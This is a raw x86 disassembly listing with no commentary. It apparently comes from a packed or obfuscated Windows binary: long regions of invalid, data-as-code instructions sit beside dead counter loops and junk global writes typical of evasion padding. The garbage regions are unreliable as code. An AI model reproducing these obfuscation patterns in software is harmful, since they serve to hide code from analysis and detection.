  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x421896
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0xbf711cdb
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	xor    al,0xdc
  409490:	inc    edx
  409491:	sbb    dh,BYTE PTR [edi-0x4fef65e7]
  409497:	loopne 0x4094b3
  409499:	push   ebx
  40949a:	or     eax,0xb58a23df
  40949f:	mov    edi,DWORD PTR [edx+0x5c7e9a1e]
  4094a5:	outs   dx,BYTE PTR ds:[esi]
  4094a6:	imul   ecx,esi,0x6d
  4094a9:	scas   al,BYTE PTR es:[edi]
  4094aa:	push   ss
  4094ab:	(bad)  
  4094ac:	cmp    ch,cl
  4094ae:	test   al,0xeb
  4094b0:	ficomp DWORD PTR [ebx-0x609c590f]
  4094b6:	cmp    cl,BYTE PTR [edx+0x4f]
  4094b9:	and    BYTE PTR [edx-0x30],al
  4094bc:	ins    DWORD PTR es:[edi],dx
  4094bd:	dec    ebp
  4094be:	and    bh,BYTE PTR [esi-0x614b75d0]
  4094c4:	jo     0x4094fa
  4094c6:	shl    BYTE PTR [ecx],0x30
  4094c9:	dec    edi
  4094ca:	adc    bh,dh
  4094cc:	ins    DWORD PTR es:[edi],dx
  4094cd:	ss (bad) 
  4094cf:	adc    dl,BYTE PTR [eax+0xc]
  4094d2:	jecxz  0x409479
  4094d4:	les    eax,FWORD PTR [eax+edx*1]
  4094d7:	pop    ds
  4094d8:	adc    ch,BYTE PTR [edi]
  4094da:	jecxz  0x40950a
  4094dc:	push   es
  4094dd:	push   ecx
  4094de:	test   al,0x17
  4094e0:	stc    
  4094e1:	mov    esi,0xaa4d2f72
  4094e6:	outs   dx,DWORD PTR ds:[esi]
  4094e7:	lss    ebx,FWORD PTR [esi-0x1b30f25a]
  4094ee:	ss (bad) 
  4094f0:	rcr    ebx,cl
  4094f2:	bound  edx,QWORD PTR [ecx]
  4094f4:	stc    
  4094f5:	aas    
  4094f6:	(bad)
  4094fa:	jmp    0x93b19472
  4094ff:	mov    dh,0xe
  409501:	int    0xca
  409503:	aad    0x8f
  409505:	pop    esp
  409506:	neg    DWORD PTR [ebp-0xf]
  409509:	repnz add esp,DWORD PTR [edi-0x626a6351]
  409510:	in     al,0xdb
  409512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409513:	push   esi
  409514:	pop    edx
  409515:	xor    cl,BYTE PTR [edx-0x10]
  409518:	fs inc edi
  40951a:	dec    esi
  40951b:	nop
  40951c:	inc    ebx
  40951d:	std    
  40951e:	push   esp
  40951f:	mov    esp,0x758b0aba
  409524:	adc    BYTE PTR [ecx-0x3f74efba],cl
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    dh,BYTE PTR [edx+edx*8+0x1f]
  409541:	jp     0x40954c
  409543:	and    DWORD PTR [esi+0x7e],edi
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	jmp    DWORD PTR [eax-0x58]
  40954d:	pop    edi
  40954e:	mov    esp,0x9aa07487
  409553:	fsubr  st,st(2)
  409555:	pop    esp
  409556:	pop    ss
  409557:	fdivr  DWORD PTR [ebx+eiz*8+0x6627e534]
  40955e:	add    BYTE PTR ds:0xbf12ecb8,cl
  409564:	jg     0x409564
  409566:	call   0xcc5e:0x4a27faac
  40956d:	adc    BYTE PTR [ebp-0x34],bl
  409570:	repz ret 0x5953
  409574:	pop    edx
  409575:	jmp    0xe816a734
  40957a:	mov    ebx,0x88a6afc8
  40957f:	mov    bh,0x85
  409581:	xchg   di,ax
  409583:	popf   
  409584:	cmp    eax,0xc31b7a7b
  409589:	mov    dh,0xe8
  40958b:	loop   0x4095a9
  40958d:	(bad)  
  40958e:	hlt    
  40958f:	cmp    BYTE PTR [edx+0x5e506416],0x1e
  409596:	xchg   edx,eax
  409597:	ret    0x2c5
  40959a:	xchg   DWORD PTR [ebx+0x75f8e041],edi
  4095a0:	dec    esp
  4095a1:	mov    ecx,0x6e1f665
  4095a6:	(bad)  
  4095a7:	fild   WORD PTR [esi]
  4095a9:	std    
  4095aa:	sbb    eax,0xd302379
  4095af:	int    0x3
  4095b1:	jae    0x40954f
  4095b3:	ins    DWORD PTR es:[edi],dx
  4095b4:	outs   dx,BYTE PTR ds:[esi]
  4095b5:	paddusb mm0,QWORD PTR [edi]
  4095b8:	test   BYTE PTR [edx],dl
  4095ba:	les    ebx,FWORD PTR [edx-0x1713afc8]
  4095c0:	xor    al,0x87
  4095c2:	and    DWORD PTR [ecx+ebx*8],ebx
  4095c5:	sub    bh,ah
  4095c7:	imul   ebx,DWORD PTR [esi],0xffffffcc
  4095ca:	out    0x46,eax
  4095cc:	jnp    0x4095ed
  4095ce:	mov    dh,0xdb
  4095d0:	outs   dx,BYTE PTR ds:[esi]
  4095d1:	fabs   
  4095d3:	jno    0x409632
  4095d5:	xchg   esi,eax
  4095d6:	inc    ecx
  4095d7:	ja     0x409649
  4095d9:	imul   esp,esi,0xffffff9e
  4095dc:	add    DWORD PTR [eax+0x33],esp
  4095df:	rol    DWORD PTR [ebx],0xc2
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    edx,DWORD PTR [ebx]
  40961c:	arpl   WORD PTR [eax],di
  40961e:	imul   ebx,DWORD PTR [ebp+0x167e7e21],0xbb7e7e7f
  409628:	pop    eax
  409629:	enter  0x4f82,0xc5
  40962d:	inc    ecx
  40962e:	jmp    0x7cd0:0x50e7ce01
  409635:	fs test eax,0x6a780b1d
  40963b:	cmc    
  40963c:	jge    0x4096b1
  40963e:	fldcw  WORD PTR [edi+0x61]
  409641:	icebp  
  409642:	test   eax,0x194f6789
  409647:	(bad)  
  409648:	jbe    0x409654
  40964a:	cmp    DWORD PTR [ecx+0x765eb6b5],esp
  409650:	add    ah,al
  409652:	xor    eax,0xb78f57dc
  409657:	call   0xaee24e57
  40965c:	mov    al,ds:0x7b123909
  409661:	mul    ebx
  409663:	push   ds
  409664:	stos   BYTE PTR es:[edi],al
  409665:	in     eax,0xc
  409667:	aas    
  409668:	loopne 0x4096b3
  40966a:	sub    DWORD PTR [ebp+ecx*2-0x62],ebp
  40966e:	cmp    al,0xae
  409670:	cli    
  409671:	out    dx,al
  409672:	jae    0x4096ad
  409674:	jmp    0x3bc7:0xba9d658c
  40967b:	imul   eax,DWORD PTR [edi+edx*2],0xffffff9c
  40967f:	aaa    
  409680:	das    
  409681:	nop
  409682:	fstp   DWORD PTR [ecx]
  409684:	jne    0x409639
  409686:	xchg   edi,eax
  409687:	pop    esp
  409688:	jp     0x409611
  40968a:	in     eax,0x60
  40968c:	pushf  
  40968d:	bound  ebx,QWORD PTR [eax-0x492a77ec]
  409693:	fcom   QWORD PTR [ebx+0x31a335bb]
  409699:	pop    eax
  40969a:	clc    
  40969b:	pop    edx
  40969c:	sbb    eax,0xe98c93c3
  4096a1:	lea    ecx,[eax+0x889c0e]
  4096a7:	call   0x5597:0xf22ed1e3
  4096ae:	jge    0x4096f5
  4096b0:	int    0x0
  4096b2:	fmul   DWORD PTR [ebp+0x1cfdb8e]
  4096b8:	imul   eax,DWORD PTR [edi-0x50bcb7f],0x1069b3a5
  4096c2:	mov    esp,0xa65df92c
  4096c7:	stos   DWORD PTR es:[edi],eax
  4096c8:	enter  0xec34,0x6b
  4096cc:	xchg   esp,eax
  4096cd:	dec    esi
  4096ce:	add    esi,ebp
  4096d0:	and    DWORD PTR [edx-0x624d9c68],edi
  4096d6:	fcomp  st(0)
  4096d8:	mov    dl,0xdb
  4096da:	mov    cl,0xce
  4096dc:	fnstcw WORD PTR [edx+0x10fb6f6c]
  4096e2:	fidivr WORD PTR [edi+0x7]
  4096e5:	out    0x92,eax
  4096e7:	fwait
  4096e8:	cli    
  4096e9:	cmc    
  4096ea:	mov    eax,0x86d70ad7
  4096ef:	out    dx,eax
  4096f0:	dec    eax
  4096f1:	lods   eax,DWORD PTR ds:[esi]
  4096f2:	call   FWORD PTR ds:0x210ad986
  4096f8:	jno    0x4096ba
  4096fa:	rol    ebx,0x6
  4096fd:	add    bh,BYTE PTR [edx-0x2a]
  409700:	cmp    al,0xad
  409702:	test   eax,ebx
  409704:	xor    BYTE PTR [ecx-0x7218781],bh
  40970a:	mov    cl,0x1b
  40970c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40970d:	and    eax,0xb6bdfe04
  409712:	(bad)  
  409713:	mul    bh
  409715:	jmp    0x409760
  409717:	dec    ebp
  409718:	(bad)  
  409719:	sbb    eax,ebp
  40971b:	fwait
  40971c:	inc    ebx
  40971d:	jl     0x409776
  40971f:	(bad)  
  409720:	inc    esi
  409721:	gs (bad) 
  409723:	mov    edx,0x83c83a72
  409728:	inc    edx
  409729:	jns    0x409723
  40972b:	cmp    DWORD PTR [edx+0x37],edx
  40972e:	jmp    0x3c941750
  409733:	stos   DWORD PTR es:[edi],eax
  409734:	out    dx,eax
  409735:	jle    0x409746
  409737:	sub    cl,BYTE PTR [esi-0x5840e695]
  40973d:	test   DWORD PTR [ebp+ecx*2+0x63],0x33c28b59
  409745:	xchg   BYTE PTR [edi+ebx*4],bl
  409748:	xor    BYTE PTR [ecx+0x2e],ch
  40974b:	push   esp
  40974c:	or     BYTE PTR [ecx],ah
  40974e:	add    al,0x51
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4245ae,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412370,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41abd6
  409776:	adc    DWORD PTR ds:0x4245ca,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417e59,0x412370
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x41235c,0x41abd2
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415115,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4245ba
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	addr16 adc ebx,ebx
  4097c2:	pusha  
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x4097e9
  4097cc:	and    DWORD PTR [edi],esi
  4097ce:	call   0x3d8bc89e
  4097d3:	std    
  4097d4:	loopne 0x40982f
  4097d6:	mov    al,0x55
  4097d8:	mov    edx,DWORD PTR [edi+ebp*4+0x61]
  4097dc:	pop    esi
  4097dd:	xchg   ecx,esp
  4097df:	jmp    0xf1817be7
  4097e4:	addr16 dec ebx
  4097e6:	and    al,0xa5
  4097e8:	xchg   edx,eax
  4097e9:	(bad)  
  4097ea:	dec    ebx
  4097eb:	sbb    BYTE PTR [ebx-0x25f28f8f],bh
  4097f1:	daa    
  4097f2:	fsubr  QWORD PTR [eax-0x43]
  4097f5:	pop    ds
  4097f6:	mov    ebp,0xa1e9e282
  4097fb:	(bad)  
  4097fc:	cmp    BYTE PTR [ebx-0x2b22c47e],al
  409802:	push   ss
  409803:	cwde   
  409804:	sub    esp,ebx
  409806:	dec    ebx
  409807:	les    esi,FWORD PTR [ebx-0x79]
  40980a:	and    ch,BYTE PTR ds:0x802444cd
  409810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409811:	mov    esi,0x85dbd3a
  409816:	clc    
  409817:	fisub  DWORD PTR ds:0xc143ff3e
  40981d:	push   ecx
  40981e:	xor    ah,BYTE PTR [ebp-0x4e]
  409821:	mov    dl,0xae
  409823:	bound  ebx,QWORD PTR [ecx-0x47ca1a8]
  409829:	push   ecx
  40982a:	mov    ch,0x7b
  40982c:	jnp    0x409824
  40982e:	fdivr  st(5),st
  409830:	fbstp  TBYTE PTR ds:0x1653aefa
  409836:	or     DWORD PTR [eax+ebx*1],ebp
  409839:	pop    esp
  40983a:	push   eax
  40983b:	bnd jno 0x4097d7
  40983e:	fdiv   QWORD PTR [eax-0x67]
  409841:	push   es
  409842:	js     0x409828
  409844:	push   cs
  409845:	and    BYTE PTR [edi-0x645d9b24],cl
  40984b:	pushf  
  40984c:	sub    eax,0xf9f54500
  409851:	int3   
  409852:	adc    al,0xb8
  409854:	cmp    BYTE PTR [esi-0x63f70973],bh
  40985a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40985c:	je     0x40989a
  40985e:	mov    ah,bh
  409860:	stos   DWORD PTR es:[edi],eax
  409861:	push   eax
  409862:	push   ebx
  409863:	mov    edi,0x89e6fe62
  409868:	jnp    0x4098bd
  40986a:	rcr    edx,1
  40986c:	ins    DWORD PTR es:[edi],dx
  40986d:	pop    edi
  40986e:	ret    
  40986f:	gs cwde 
  409871:	push   edi
  409872:	dec    edx
  409873:	stos   DWORD PTR es:[edi],eax
  409874:	ficomp WORD PTR [edx-0x3cafc8f6]
  40987a:	and    dh,BYTE PTR [esi+0x336354cf]
  409880:	xor    ebp,DWORD PTR [ebx]
  409882:	adc    al,BYTE PTR fs:[ebp+0x34]
  409886:	test   al,0x75
  409888:	stos   BYTE PTR es:[edi],al
  409889:	cld    
  40988a:	retf   
  40988b:	jbe    0x4098e9
  40988d:	mov    ds:0x90d2e076,al
  409892:	inc    edx
  409893:	mov    ds:0x985e73e7,al
  409898:	call   0x6752a40e
  40989d:	cmp    DWORD PTR ds:[eax],eax
  4098a0:	scas   al,BYTE PTR es:[edi]
  4098a1:	mov    WORD PTR [esi],gs
  4098a3:	sbb    edx,DWORD PTR [ebx+0x11b8a1fa]
  4098a9:	jae    0x40983d
  4098ab:	adc    al,0x59
  4098ad:	jae    0x409899
  4098af:	cmp    dl,BYTE PTR [ebp+0x12c9d0a3]
  4098b5:	add    DWORD PTR [ecx+0x1dbc2280],0x9379b58b
  4098bf:	lock fnstsw WORD PTR [ebp+0x7ac5c790]
  4098c6:	jl     0x40993a
  4098c8:	pop    esi
  4098c9:	scas   eax,DWORD PTR es:[edi]
  4098ca:	jecxz  0x409900
  4098cc:	inc    ebp
  4098cd:	std    
  4098ce:	cld    
  4098cf:	mov    al,ds:0xadd2eb3b
  4098d4:	arpl   WORD PTR [ebp-0x24],bx
  4098d7:	lods   eax,DWORD PTR ds:[esi]
  4098d8:	jb     0x4098b7
  4098da:	inc    ecx
  4098db:	cdq    
  4098dc:	fbstp  TBYTE PTR [edi-0x63]
  4098df:	enter  0x913f,0x22
  4098e3:	cmp    bl,BYTE PTR [edi+0x6a]
  4098e6:	push   eax
  4098e7:	es mov ah,0x68
  4098ea:	push   eax
  4098eb:	cli    
  4098ec:	sahf   
  4098ed:	jbe    0x4098f9
  4098ef:	xor    esi,ecx
  4098f1:	stc    
  4098f2:	or     BYTE PTR [ebx+0x25811445],0x64
  4098f9:	and    eax,DWORD PTR [ecx+0x0]
  4098fc:	add    BYTE PTR [eax],al
  4098fe:	add    BYTE PTR [eax],al
  409900:	mov    edx,DWORD PTR ds:0x412364
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x412364,edx
  40990d:	cmp    DWORD PTR ds:0x412364,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x412364,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x412364
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x412364,edx
  40994a:	cmp    DWORD PTR ds:0x412364,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0xfd90f24c
  409977:	imul   DWORD PTR [ebp+0x27]
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x409927
  409981:	outs   dx,BYTE PTR ds:[esi]
  409982:	inc    eax
  409983:	call   0x9fe6:0xb014854e
  40998a:	cmp    eax,0xc3eab06
  40998f:	imul   edx,esp,0x9b52df3d
  409995:	jle    0x40999c
  409997:	int    0xd8
  409999:	adc    bl,ch
  40999b:	test   DWORD PTR [ebp-0x5f],eax
  40999e:	das    
  40999f:	sahf   
  4099a0:	call   0xb85d:0x4c84563d
  4099a7:	jno    0x4099a9
  4099a9:	out    dx,eax
  4099aa:	dec    ebx
  4099ab:	dec    eax
  4099ac:	lods   eax,DWORD PTR ds:[esi]
  4099ad:	mov    al,BYTE PTR [ebx-0x7e4d74e4]
  4099b3:	mov    ebp,0x6e8a6836
  4099b8:	aad    0x67
  4099ba:	sbb    eax,0xd42ce8b3
  4099bf:	xchg   edi,eax
  4099c0:	mov    edx,0x529c24dc
  4099c5:	shr    BYTE PTR [eax+edi*4+0x2782dcbf],1
  4099cc:	lds    esi,FWORD PTR [ecx-0x2a0a1a26]
  4099d2:	sbb    DWORD PTR ds:0xd20af05a,esi
  4099d8:	and    ecx,eax
  4099da:	jne    0x4099b7
  4099dc:	mov    cl,0x1f
  4099de:	mov    bx,0x461c
  4099e2:	fs push ebp
  4099e4:	(bad)  
  4099e5:	repz sub bh,BYTE PTR [ecx+0x2f19e738]
  4099ec:	dec    ebp
  4099ed:	cmc    
  4099ee:	popf   
  4099ef:	mul    esi
  4099f1:	push   eax
  4099f2:	and    DWORD PTR [edi],edi
  4099f4:	shl    DWORD PTR [eax+eax*4-0x4ed18973],1
  4099fb:	xchg   esi,eax
  4099fc:	dec    edx
  4099fd:	(bad)  
  4099ff:	xchg   ebp,eax
  409a00:	adc    cl,BYTE PTR [ebp-0x5a2005a5]
  409a06:	mov    dl,0x95
  409a08:	pusha  
  409a09:	fist   DWORD PTR [esi+0x44]
  409a0c:	fnstenv [eax-0x3c1cec3f]
  409a12:	aaa    
  409a13:	les    ebp,FWORD PTR [ebx]
  409a15:	in     al,dx
  409a16:	stos   BYTE PTR es:[edi],al
  409a17:	and    al,0xc3
  409a19:	adc    dl,ah
  409a1b:	inc    ebp
  409a1c:	fild   QWORD PTR es:[esi]
  409a1f:	cwde   
  409a20:	je     0x409a5e
  409a22:	inc    esi
  409a23:	mov    DWORD PTR [ebx+edi*8],ebx
  409a26:	xchg   ebp,eax
  409a27:	or     ah,dh
  409a29:	ds mov dl,0x31
  409a2c:	in     eax,dx
  409a2d:	mov    ebp,0xef3b5ae2
  409a32:	mov    fs,WORD PTR [ebp+0x7f]
  409a35:	add    eax,0x15d4f3e0
  409a3a:	icebp  
  409a3b:	mov    ds:0xdf6b2779,al
  409a40:	xor    eax,0x1623b28c
  409a45:	out    dx,eax
  409a46:	in     al,dx
  409a47:	dec    ebx
  409a48:	test   BYTE PTR [ebx+0x57fbd2dd],cl
  409a4e:	div    DWORD PTR [ebp-0x36]
  409a51:	inc    esp
  409a52:	inc    ebp
  409a53:	xchg   ebp,eax
  409a54:	adc    BYTE PTR [ecx],ch
  409a56:	jmp    0x6ca9:0x7f00bdc9
  409a5d:	cmp    al,0x9a
  409a5f:	idiv   DWORD PTR [edi-0x19]
  409a62:	stos   DWORD PTR es:[edi],eax
  409a63:	xchg   edx,eax
  409a64:	std    
  409a65:	call   0xc852:0xa7856a45
  409a6c:	bound  ebx,QWORD PTR [ecx]
  409a6e:	push   ebx
  409a6f:	dec    eax
  409a70:	mov    cs,WORD PTR [edi+0x48]
  409a73:	test   ebx,esp
  409a75:	hlt    
  409a76:	ins    BYTE PTR es:[edi],dx
  409a77:	aam    0x75
  409a79:	loop   0x409aad
  409a7b:	sar    BYTE PTR [ebx-0x6c9d7f8],cl
  409a81:	loopne 0x409a30
  409a83:	out    0x52,al
  409a85:	cmc    
  409a86:	pop    esi
  409a87:	stos   DWORD PTR es:[edi],eax
  409a88:	and    esp,DWORD PTR [eax]
  409a8a:	mov    esp,0xb4dd12
  409a8f:	or     al,0x4f
  409a91:	inc    esp
  409a92:	push   cs
  409a93:	push   edx
  409a94:	dec    eax
  409a95:	cdq    
  409a96:	mov    DWORD PTR [esi+ebp*4],0x5c3fb5dd
  409a9d:	xor    al,0x86
  409a9f:	icebp  
  409aa0:	call   0x432f:0x3aef0427
  409aa7:	push   ebx
  409aa8:	mov    DWORD PTR [edx+0x8],eax
  409aab:	mov    eax,DWORD PTR [ebp+0x1c]
  409aae:	mov    edx,DWORD PTR [ebp+0x10]
  409ab1:	mov    DWORD PTR [edx+0xc],eax
  409ab4:	mov    eax,DWORD PTR [ebp+0x20]
  409ab7:	mov    edx,DWORD PTR [ebp+0x10]
  409aba:	mov    DWORD PTR [edx+0x10],eax
  409abd:	mov    eax,eax
  409abf:	mov    eax,DWORD PTR [ebp+0x14]
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417e4d,0x412378
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4245b6
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415111,0x412368
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415115,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412378,0x417e41
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4245c2,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415119,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412378,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415101,0x415109
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4245c2,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417e41
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x412354,0x4245b2
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x412354,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41abda
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4245c2,0x417e4d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41abca,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41abca
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41abca,ecx
  409bf0:	cmp    DWORD PTR ds:0x41abca,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41abca,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412370,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412370,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412370,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41abe2
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412370
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412370,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4245b2,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415119,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x412364,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41510d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41abda,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415105,0x41abe2
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
